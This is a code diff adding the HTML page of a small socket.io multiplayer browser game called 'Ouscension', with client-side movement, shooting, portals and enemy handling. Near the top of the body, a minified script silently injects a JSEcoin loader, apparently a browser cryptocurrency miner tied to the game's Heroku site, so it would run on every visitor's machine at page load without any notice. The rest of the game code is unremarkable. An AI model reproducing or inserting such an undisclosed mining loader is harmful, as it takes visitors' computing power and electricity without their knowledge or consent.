@@ -1,0 +1,412 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Ouscension</title>
+    <style>
+      body {
+              -webkit-touch-callout: none;
+              -webkit-user-select: none;
+              -khtml-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+                overflow: hidden;
+      }
+      .player {
+                width: 25px;
+                height: 25px;
+                background: rgb(0, 255, 255);
+                background-image: url("https://image.ibb.co/h55aMn/player.gif");
+                position: absolute;
+                z-index: 1000000;
+      }
+      .bullet {
+                width: 10px;
+                height: 5px;
+                background: #00ff00;
+                position: absolute;
+                z-index: 10;
+      }
+      .portal {
+                width: 40px;
+                height: 40px;
+                background: #000000;
+                color: rgb(200, 200, 200);
+                text-align: center;
+                position: absolute;
+                z-index: 5;
+      }
+      .floor {
+                width: 500px;
+                height: 500px;
+                background: rgb(100, 100, 100);
+                background-image: url("https://image.ibb.co/g47Bu7/floor.gif");
+                position: absolute;
+                z-index: 0;
+      }
+      .enemy {
+                width: 30px;
+                height: 30px;
+                background: rgb(255, 0, 0);
+                background-image: url("https://image.ibb.co/bBKx1n/SkeleBoi.gif");
+                position: absolute;
+                z-index: 50;
+      }
+    </style>
+  </head>
+  <body>
+    <script type="text/javascript">
+      !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/104653/ouscension.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
+    </script>
+
+
+    <div id="playerContainer"></div>
+    <div id="bulletContainer"></div>
+    <div id="portalContainer"></div>
+    <div id="floorContainer"></div>
+    <div id="enemyContainer"></div>
+
+    <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
+    <script src="https://code.jquery.com/jquery-1.11.1.js"></script>
+    <script>
+      $(function () {
+
+        var socket = io();
+        var createdSelf = false;
+
+        socket.emit('createChar');
+
+        var wKey = 87;
+        var aKey = 65;
+        var sKey = 83;
+        var dKey = 68;
+
+        var eKey = 69;
+
+        var controller = new Object();
+
+            var screenX = 0;
+            var screenY = 0;
+            if(true) {
+                var w = window;
+                d = document;
+                e = d.documentElement;
+                g = d.getElementsByTagName('body')[0];
+                x = w.innerWidth || e.clientWidth || g.clientWidth;
+                y = w.innerHeight|| e.clientHeight|| g.clientHeight;
+                screenX = x;
+                screenY = y;
+            }
+
+        var players = [];
+
+        var player = new Object();
+          player.x = 0;
+          player.y = 0;
+          player.moveSpeed = 20;
+          player.w = 25;
+          player.h = 25;
+          player.world = 'Hub';
+
+        var bullets = [];
+        var portals = [];
+        var floors = [];
+        var enemies = [];
+
+
+
+        function checkCollision (a,b) {
+                return a.x < b.x + b.w && a.x + a.w > b.x && a.y < b.y + b.h && a.y + a.h > b.y;
+            }
+            function createSprite(element, x, y, w, h) {
+                var result = new Object();
+                result.element = element;
+                result.x = x;
+                result.y = y;
+                result.w = w;
+                result.h = h;
+
+                return result;
+            }
+        function setPosition(sprite) { if(createdSelf) {
+          var e = document.getElementById(sprite.element);
+
+          if(sprite.element === player.element) {
+            e.style.left = screenX / 2 + "px";
+            e.style.top = screenY / 2 + "px";
+          } else {
+          if(player.world === sprite.world) {
+              e.style.left = sprite.x - player.x + screenX / 2 + "px";
+              e.style.top = sprite.y - player.y + screenY / 2 + "px";
+              e.style.display = 'block';
+          } else {
+            e.style.display = 'none';
+          }
+          }
+        }}
+            document.onkeydown = function(evt) {
+                toggleKey(evt.keyCode, true);
+              if(evt.keyCode == eKey) {
+                for(i = 0; i < portals.length; i++) {
+                  if(portals[i].world === player.world) {
+                    if(checkCollision(player, portals[i])) {
+                      if(portals[i].world !== 'Hub') {
+                        socket.emit('dungeonComplete', portals[i].world);
+                      } else {
+                        player.world = portals[i].teleport;
+                        player.x = 0;
+                        player.y = 0;
+                      }
+                    }
+                  }
+                }
+              }
+            };
+            document.onkeyup = function(evt) {
+                toggleKey(evt.keyCode, false)
+            };
+            document.onmousemove = function(evt) {
+              var angle = Math.atan2((evt.y - screenY / 2), (evt.x - screenX / 2)) * (180 / Math.PI);
+              player.angle = angle;
+            };
+            document.onmousedown = function(evt) {
+              if(evt.which === 1) {
+                socket.emit('createBullet', player);
+              }
+            }
+
+            function toggleKey(keyCode, isPressed) {
+                if(keyCode == wKey) {
+                    controller.w = isPressed;
+                }
+                if(keyCode == aKey) {
+                    controller.a = isPressed;
+                }
+                if(keyCode == sKey) {
+                    controller.s = isPressed;
+                }
+                if(keyCode == dKey) {
+                    controller.d = isPressed;
+                }
+            }
+            function handleControls() {
+                if(controller.w) {
+                    player.y -= player.moveSpeed;
+                }
+                if(controller.a) {
+                    player.x -= player.moveSpeed;
+                }
+                if(controller.s) {
+                    player.y += player.moveSpeed;
+                }
+                if(controller.d) {
+                    player.x += player.moveSpeed;
+                }
+            }
+
+            socket.on('loadNewChar', function(value) {
+
+                var element = document.createElement('div');
+                element.className = 'player';
+                //element.innerHTML = usr;
+                element.id = value;
+                element.style.left = '-50px';
+                element.style.top = '-50px';
+
+                if(createdSelf === false) {
+                  createdSelf = true;
+                  player.element = value;
+
+                  element.style.left = screenX / 2 + 'px';
+                  element.style.top = screenY / 2 + 'px';
+                }
+
+                document.getElementById('playerContainer').appendChild(element);
+              });
+
+            socket.on('showPlayer', function(playerSprite) {
+          if(createdSelf && playerSprite.element !== null && playerSprite.element !== undefined) {
+            if($("#" + playerSprite.element).length == 0) {
+              var element = document.createElement('div');
+              element.className = 'player';
+              //element.innerHTML = name;
+              element.id = playerSprite.element;
+              document.getElementById('playerContainer').appendChild(element);
+            }
+
+            var inPlayerArray = false;
+            for(i = 0; i < players.length; i++) {
+              if(playerSprite.element === players[i].element) {
+                inPlayerArray = true;
+                players[i] = playerSprite;
+              }
+            }
+
+            if(inPlayerArray === false) {
+              players[players.length] = playerSprite;
+            }
+
+            document.getElementById(playerSprite.element).style.transform = 'rotate(' + playerSprite.angle + 'deg)';
+          }
+          });
+
+        socket.on('delete', function(value) {
+          var element = document.getElementById(value);
+          element.style.display = 'none';
+          element.parentNode.removeChild(element);
+        });
+
+        socket.on('playerDungeonComplete', function(dungeon) {
+          if(player.world === dungeon) {
+            player.world = 'Hub';
+            player.x = 0;
+            player.y = 0;
+          }
+        });
+
+        function bulletHandler() {
+          for(i = 0; i < bullets.length; i++) {
+
+            if(createdSelf && bullets[i].element !== null) {
+              if($("#" + bullets[i].element).length == 0) {
+                var element = document.createElement('div');
+                element.className = 'bullet';
+                element.id = bullets[i].element;
+                element.style.transform = 'rotate(' + bullets[i].angle + 'deg)';
+                document.getElementById('bulletContainer').appendChild(element);
+              }
+            }
+
+            if(bullets[i].lifeTimer < 0) {
+              var element = document.getElementById(bullets[i].element);
+              if(element !== null) {
+                element.style.display = "none";
+                element.parentNode.removeChild(element);
+              }
+            } else {
+              setPosition(bullets[i]);
+            }
+          }
+        }
+
+        function portalHandler() {
+          for(i = 0; i < portals.length; i++) {
+
+            if(createdSelf && portals[i].element !== null) {
+              if($("#" + portals[i].element).length == 0) {
+                var element = document.createElement("div");
+                element.className = "portal";
+                element.id = portals[i].element;
+                element.innerHTML = portals[i].teleport;
+                element.style.left = '-50px';
+                element.style.top = '-50px';
+                document.getElementById('portalContainer').appendChild(element);
+              }
+            }
+
+            setPosition(portals[i]);
+          }
+        }
+
+        function floorHandler() {
+          for(i = 0; i < floors.length; i++) {
+
+            if(createdSelf && floors[i].element !== null) {
+              if($("#" + floors[i].element).length == 0) {
+                var element = document.createElement("div");
+                element.className = "floor";
+                element.id = floors[i].element;
+                element.style.left = '-50px';
+                element.style.top = '-50px';
+                document.getElementById('floorContainer').appendChild(element);
+              }
+            }
+
+            setPosition(floors[i]);
+          }
+        }
+
+        function enemyHandler() {
+          for(i = 0; i < enemies.length; i++) {
+
+            if(enemies[i].element !== null) {
+              if($("#" + enemies[i].element).length == 0) {
+                var element = document.createElement("div");
+                element.className = "enemy";
+                element.id = enemies[i].element;
+                element.style.left = '-50px';
+                element.style.top = '-50px';
+                document.getElementById('enemyContainer').appendChild(element);
+              }
+            }
+
+            setPosition(enemies[i]);
+            document.getElementById(enemies[i].element).style.transform = 'rotate(' + enemies[i].angle + 'deg)';
+
+            for(j = 0; j < bullets.length; j++) {
+              if(bullets[j].owner === player.element) {
+                if(bullets[j].world === enemies[i].world) {
+                  if(checkCollision(bullets[j], enemies[i])) {
+                    socket.emit('hurtEnemy', enemies[i].element);
+                    socket.emit('deleteBullet', bullets[j].element);
+                  }
+                }
+              }
+            }
+          }
+        }
+
+        function blocker(sprite) {
+          if(sprite.preX === undefined) {
+            sprite.preX = sprite.x;
+            sprite.preY = sprite.Y;
+          }
+
+          var onFloor = false;
+
+          for(i = 0; i < floors.length; i++) {
+            if(sprite.world === floors[i].world) {
+              if(checkCollision(sprite, floors[i])) {
+                onFloor = true;
+              }
+            }
+          }
+
+          if(!onFloor) {
+            sprite.x = sprite.preX;
+            sprite.y = sprite.preY;
+          }
+
+          sprite.preX = sprite.x;
+          sprite.preY = sprite.y;
+        }
+
+            //Update
+            socket.on('loop', function(bulletsSetter, portalsSetter, floorsSetter, enemiesSetter) {
+              bullets = bulletsSetter
+              portals = portalsSetter;
+              floors = floorsSetter;
+              enemies = enemiesSetter;
+
+              handleControls();
+              bulletHandler();
+              portalHandler();
+              floorHandler();
+              enemyHandler();
+
+              blocker(player);
+
+              for(i = 0; i < players.length; i++) {
+                setPosition(players[i]);
+              }
+              socket.emit('playerInfo', player)
+            });
+
+        document.addEventListener("contextmenu", function(e){
+          e.preventDefault();
+        }, false);
+
+      });
+    </script>
+  </body>
+</html>
